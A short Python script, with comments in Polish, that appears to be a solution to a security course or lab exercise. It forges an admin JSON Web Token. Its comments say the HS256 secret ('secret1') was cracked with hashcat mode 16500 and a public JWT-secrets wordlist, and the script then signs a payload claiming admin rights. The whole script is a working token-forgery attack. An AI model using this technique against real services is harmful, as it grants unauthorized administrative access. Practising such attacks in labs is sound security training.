#!/usr/bin/env python3
# Zadanie 3.6 (f) - podrobienie tokena admina zlamanym sekretem
import jwt, time

SECRET = "secret1"   # sekret zlamany hashcatem (tryb 16500) + slownik wallarm/jwt-secrets

payload = {
    "sub": "admin",
    "admin": 1,
    "exp": int(time.time()) + 3600,
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(token)
